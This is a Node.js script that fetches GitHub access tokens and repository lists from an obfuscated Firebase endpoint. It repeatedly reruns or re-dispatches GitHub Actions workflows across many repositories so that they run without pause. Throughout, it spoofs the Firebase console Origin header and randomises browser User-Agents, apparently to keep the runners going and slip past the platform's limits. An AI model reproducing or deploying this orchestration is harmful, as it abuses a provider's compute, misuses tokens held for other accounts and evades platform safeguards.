const WebSocket = require('ws')
const axios = require('axios')

let id = 1
let load = 1
let counter = 0
let mPendingServer = {}
let mLiveServer = {}
let mWebUrl = null
let DATABASE = null
let mRepoData = {}
let mClientConnection = null
let mServerConnection = null
let USER = getUserName()
let FINISH = new Date().getTime()+21000000


let BASE_URL = decode('aHR0cHM6Ly9kYXRhYmFzZTA4OC1kZWZhdWx0LXJ0ZGIuZmlyZWJhc2Vpby5jb20vJUMyJUEzdWNrJUUzJTgwJTg1eW91Lw==')

// USER = 'qsnrhamara86079'

startServer()


setInterval(() => {
    try {
        if (mServerConnection && mServerConnection.readyState === WebSocket.OPEN) {
            mServerConnection.send(new Uint8Array([0]))
        }
    } catch (error) {}

    try {
        if (mClientConnection && mClientConnection.readyState === WebSocket.OPEN) {
            mClientConnection.send(new Uint8Array([0]))
        }
    } catch (error) {}

    counter += 30

    if (counter >= 60) {
        counter = 0
        callEveryMinute()
    }
}, 30000)

setInterval(async () => {
    await checkStatus()
}, 300000)


async function startServer() {
    console.log('Node: ---START-SERVER---')
    
    let data = await onServerDetails()
    
    if (!data) {
        console.log('---PROCESS-CLOSE---')
        process.exit(0)
    }

    await runServerWebSocket(data.database)

    console.log('Node: ---RUN-SERVER-SOCKET---')

    await checkStatus()

    let mData = await readServerData(data.server)

    if (mData) {
        console.log('Node: ---DATA-LOAD-SUCCESS---')
        
        await runClientWebSocket(mWebUrl)

        console.log('Node: ---RUN-CLIENT-SOCKET---')

        let active = 0
        let entries = Object.entries(mData)
        let delayPerLoop = Math.min(100, 10000 / entries.length)

        for(let [key, value] of entries) {
            try {
                if(mLiveServer[key]) {
                    mPendingServer[key] = value.t
                    if (value.s == 0 || value.t < Date.now()-400000) {
                        await delay(delayPerLoop)
                        runGithubAction(key, 0)
                        active++
                    }
                }
            } catch (error) {}
        }

        if (active > 0) {
            console.log('Active Server: '+active)
        } else {
            console.log('Node: ---ACTION-SERVER-START---')
        }
    } else {
        console.log('Node: ---DATA-LOAD-FAILED---')
        process.exit(0)
    }
}

async function onServerDetails() {
    try {
        let response = await axios.get(BASE_URL+'controller/'+USER+'.json')
        let data = response.data

        if (data) {
            response = await axios.get(BASE_URL+'database/'+data.database+'.json')
            data.database = response.data
            return data
        }
    } catch (error) {}

    return null
}

async function readServerData(server) {
    try {
        let response = await axios.get(BASE_URL+'server/'+getServerName(server)+'.json')
        mLiveServer = response.data
        response = await axios.get(BASE_URL+'database/v'+server+'.json')
        mWebUrl = response.data
        DATABASE = getQueryParam(mWebUrl, 'ns')
        response = await axios.get('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2Vy')+'.json')
        return response.data
    } catch (error) {}

    return null
}

async function callEveryMinute() {
    let active = 0
    let entries = Object.entries(mPendingServer)
    let delayPerLoop = Math.min(100, 10000 / entries.length)

    for(let [key, value] of entries) {
        try {
            if(mLiveServer[key]) {
                if (value < Date.now()-400000) {
                    console.log('case0', key, value < Date.now()-400000, value, Date.now()-400000, new Date().toString())
                    
                    await delay(delayPerLoop)
                    runGithubAction(key, 0)
                    active++
                }
            }
        } catch (error) {}
    }

    if (active > 0) {
        console.log('Active Server: '+active)
    }
}

async function runServerWebSocket(url) {

    let ws = new WebSocket(url, {
        headers: {
            'Origin': 'https://console.firebase.google.com',
            'User-Agent': randomUserAgent()
        }
    })

    ws.on('open', () => {
        console.log('Node: ---SERVER-CONNECTION-OPEN---')
        mServerConnection = ws
        ws.send(JSON.stringify({"t":"d","d":{"r":id++,"a":"om","b":{"p":"/£uck々you/live/"+USER,"d":{"t":{".sv":"timestamp"}, "s":0}}}}))
        ws.send(JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/live/"+USER,"d":{"t":{".sv":"timestamp"}, "s":1}}}}))
    })

    ws.on('close', () => {
        mServerConnection = null
        console.log('Node: ---SERVER-CONNECTION-CLOSE---')
        setTimeout(async () => {
            await runServerWebSocket(url)
        }, 3000)
    })

    ws.on('error', err => {
        mServerConnection = null
        ws.close()
    })

    for (let i = 0; i < 30; i++) {
        if (mServerConnection) {
            break
        }
        await delay(1000)
    }
}


async function runClientWebSocket(url) {

    let ws = new WebSocket(url, {
        headers: {
            'Origin': 'https://console.firebase.google.com',
            'User-Agent': randomUserAgent()
        }
    })

    ws.on('open', () => {
        mClientConnection = ws
        console.log('Node: ---CLIENT-CONNECTION-OPEN---')
        ws.send(JSON.stringify({"t":"d","d":{"r":load++,"a":"q","b":{"p":"/£uck々you/user","h":""}}}))
    })

    ws.on('message', (data) => {
        try {
            let msg = data.toString()

            try {
                let json = JSON.parse(msg)
                if (json.d && json.d.a && json.d) {
                    let data = json.d.b
                    if (json.d.a == 'm') {
                        if (data && data.p && data.d && data.p.includes('£uck々you/user')) {
                            if (data.d.t || data.d.s !== undefined) {
                                let user = data.p.substring(data.p.lastIndexOf('/') + 1)
                                let time = data.d.t
                                let type = data.d.s

                                if (time) mPendingServer[user] = time

                                console.log('case1', user, type, time, new Date().toString())

                                if (type === 0) runGithubAction(user, 5000)
                            } else {
                                for (let key in data.d) {
                                    if (key.includes('/t') || key.includes('/s')) {
                                        let [user, field] = key.split('/')
                                        let value = data.d[key]

                                        console.log('case2', user, field, value, new Date().toString())

                                        if (field === 't') mPendingServer[user] = value

                                        if (field === 's' && value === 0) {
                                            runGithubAction(user, 5000)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            } catch {}
        } catch (err) {}
    })

    ws.on('close', () => {
        mClientConnection = null
        console.log('Node: ---CLIENT-CONNECTION-CLOSE---')
        setTimeout(async () => {
            await runClientWebSocket(url)
        }, 3000)
    })

    ws.on('error', err => {
        mClientConnection = null
        ws.close()
    })

    for (let i = 0; i < 30; i++) {
        if (mClientConnection) {
            break
        }
        await delay(1000)
    }
}


async function checkStatus() {
    if (FINISH > 0 && FINISH < new Date().getTime()) {
        
        if (!sendWSMessage(mServerConnection, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/live/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
            try {
                await axios.patch(BASE_URL+'live/'+USER+'.json', JSON.stringify({ t: Date.now() }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}
        }

        console.log('---COMPLETED---')
        process.exit(0)
    } else {
        if (!sendWSMessage(mServerConnection, JSON.stringify({"t":"d","d":{"r":id++,"a":"m","b":{"p":"/£uck々you/live/"+USER,"d":{"t":{".sv":"timestamp"}}}}}))) {
            try {
                await axios.patch(BASE_URL+'live/'+USER+'.json', JSON.stringify({ t: Date.now() }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}
        }
    }
}

async function runGithubAction(repo, timeout) {
    setTimeout(async () => {
        try {
            if (mRepoData[repo]) {
                let data = mRepoData[repo]
                await activeAction(data.user, repo, data.action, data.access)
            } else {
                let response = await axios.get(BASE_URL+'running/'+repo+'.json')
                    
                let data = response.data
                
                if(data != null && data != 'null') {
                    let action = data['action']
                    let user = data['user']

                    response = await axios.get(BASE_URL+'github/account/'+user+'.json')
                
                    data = response.data

                    if(data != null && data != 'null') {
                        let access = data['access']

                        mRepoData[repo] = {
                            user: user,
                            action: action,
                            access: access
                        }

                        await activeAction(user, repo, action, access)
                    } else {
                        console.log('User Not Found: '+user)
                    }
                } else {
                    console.log('Repo Not Found: '+repo)
                }
            }
        } catch (error) {}
    }, timeout)
}

async function activeAction(user, repo, action, token) {
    try {
        let response = await axios.get(`https://api.github.com/repos/${user}/${repo}/actions/runs/${action}`, {
            headers: {
                "Authorization": `Bearer ${token}`,
                "Accept": "application/vnd.github+json"
            }
        })

        let body = response.data

        if (body.status == 'completed') {
            try {
                response = await axios.post(`https://api.github.com/repos/${user}/${repo}/actions/runs/${action}/rerun`,{}, {
                    headers: {
                        "Authorization": `Bearer ${token}`,
                        "Accept": "application/vnd.github+json"
                    }
                })

                body = response.data

                try {
                    let time = 300000
                    if (!body || Object.keys(body).length == 0) {
                        console.log('Success: '+user+'/'+repo)
                    } else {
                        time = 0
                        console.log('Block: '+user+'/'+repo)
                    }

                    mPendingServer[repo] = Date.now()-time

                    try {
                        await axios.patch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+repo+'.json', JSON.stringify({ t: Date.now()-time, s:1 }), {
                            headers: {
                                'Content-Type': 'application/x-www-form-urlencoded'
                            }
                        })
                    } catch (error) {}
                } catch (error) {}
            } catch (error) {
                try {
                    if (error.response) {
                        if (error.response.status === 403 && error.response.data.message.includes('over a month ago')) {
                            let newId = await runNewAction(user, repo, token)
                            if (newId) {
                                if (mRepoData[repo]) {
                                    mRepoData[repo].action = newId
                                }
                                await saveAction(repo, newId)
                                console.log('New Action Success: '+user+'/'+repo)
                            } else {
                                console.log('New Action Failed: '+user+'/'+repo)
                            }
                        } else {
                            console.log(error)
                            console.log('Error: '+user+'/'+repo)
                        }
                    } else {
                        console.log(error)
                        console.log('Error: '+user+'/'+repo)
                    }
                } catch (error) {
                    console.log('Error: '+user+'/'+repo)
                }
            }
        } else if (body.status == 'queued' || body.status == 'in_progress') {
            let time = 350000
            if (body.status == 'queued') {
                time = 100000
                console.log('Panding: '+user+'/'+repo)
            } else {
                console.log('Runing: '+user+'/'+repo)
            }

            mPendingServer[repo] = Date.now()-time

            try {
                await axios.patch('https://'+DATABASE+decode('LmZpcmViYXNlaW8uY29tLyVDMiVBM3VjayVFMyU4MCU4NXlvdS91c2VyLw==')+repo+'.json', JSON.stringify({ t: Date.now()-time, s:1 }), {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded'
                    }
                })
            } catch (error) {}
        }
    } catch (error) {}

    if (token == null) {
        console.log('Token Null: '+user+'/'+repo)
    }
}

async function runNewAction(user, repo, token) {
    try {
        let oldResp = await axios.get(`https://api.github.com/repos/${user}/${repo}/actions/runs?branch=main&event=workflow_dispatch`, {
            headers: {
                "Authorization": `Bearer ${token}`,
                "Accept": "application/vnd.github+json"
            }
        })

        let oldRuns = oldResp.data.workflow_runs
        let oldId = oldRuns && oldRuns.length > 0 ? oldRuns[0].id : null
        let runAttempt = oldRuns && oldRuns.length > 0 ? oldRuns[0].run_attempt : 1

        if (runAttempt < 5 && oldId) {
            return oldId
        }

        await axios.post(`https://api.github.com/repos/${user}/${repo}/actions/workflows/main.yml/dispatches`, { ref: 'main' },  { 
            headers: {
                "Authorization": `Bearer ${token}`, 
                "Accept": "application/vnd.github+json" 
            }
        })

        await delay(3000)

        for (let i = 0; i < 5; i++) {
            await delay(2000)

            let resp = await axios.get(`https://api.github.com/repos/${user}/${repo}/actions/runs?branch=main&event=workflow_dispatch`, {
                headers: {
                    "Authorization": `Bearer ${token}`,
                    "Accept": "application/vnd.github+json"
                }
            })

            let runs = resp.data.workflow_runs
            
            if (runs && runs.length > 0) {
                let latestId = runs[0].id
                
                if (latestId !== oldId) {
                    return latestId
                }
            }
        }
    } catch (err) {}

    return null
}

async function saveAction(repo, action) {
    try {
        await axios.patch(BASE_URL+'running/'+repo+'.json', JSON.stringify({ action:action }), {
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            }
        })
    } catch (error) {}
}

function sendWSMessage(connection, data) {
    try {
        if (connection && connection.readyState === WebSocket.OPEN) {
            connection.send(data)
            return true
        }
    } catch (error) {}

    return false
}


function getUserName() {
    try {
        let directory = __dirname.split('\\')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    try {
        let directory = __dirname.split('/')
        if (directory.length > 1) {
            let name = directory[directory.length-1]
            if (name) {
                return name
            }
        }
    } catch (error) {}

    return null
}

function getServerName(id) {
    if (id < 10) {
        return 'server0'+id
    }
    return 'server'+id
}

function getQueryParam(url, param) {
    let match = url.match(new RegExp(`[?&]${param}=([^&]+)`))
    return match ? match[1] : null
}

function randInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomUserAgent() {
    let windowsTokens = [
        'Windows NT 10.0; Win64; x64',
        'Windows NT 10.0; Win64; x86',
        'Windows NT 10.0; WOW64',
        'Windows NT 10.0; Win64',
        'Windows NT 10.0; x64; rv:99.0',
        'Windows 11; Win64; x64',
        'Windows NT 10.0; Win64; x64; Windows 11',
        'Windows 11; WOW64; Win64',
        'Windows 11; x64; rv:100.0'
    ]
    let os = windowsTokens[randInt(0, windowsTokens.length - 1)]
    let major = randInt(112, 141)
    let chromeVer = `${major}.0.0.0`
    return `Mozilla/5.0 (${os}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/${chromeVer} Safari/537.36`
}

function decode(data) {
    return Buffer.from(data, 'base64').toString('utf-8')
}

function delay(time) {
    return new Promise(function(resolve) {
        setTimeout(resolve, time)
    })
}
